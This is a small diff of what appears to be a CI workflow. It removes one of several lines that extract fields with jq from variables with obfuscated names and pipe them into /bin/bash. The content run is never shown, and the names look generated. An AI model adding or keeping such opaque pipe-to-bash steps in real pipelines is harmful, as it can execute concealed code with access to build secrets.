@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$bv892" | jq -r .xkag878 | /bin/bash
           printf '%s' "$dkv85517" | jq -r .ufpt08 | /bin/bash
           printf '%s' "$lg01463" | jq -r .ll02127 | /bin/bash
-          echo $sg72 | jq -r .joidc8463 | /bin/bash
           echo $ju74840 | jq -r .owg63 | /bin/bash
 
       - name: Archive results
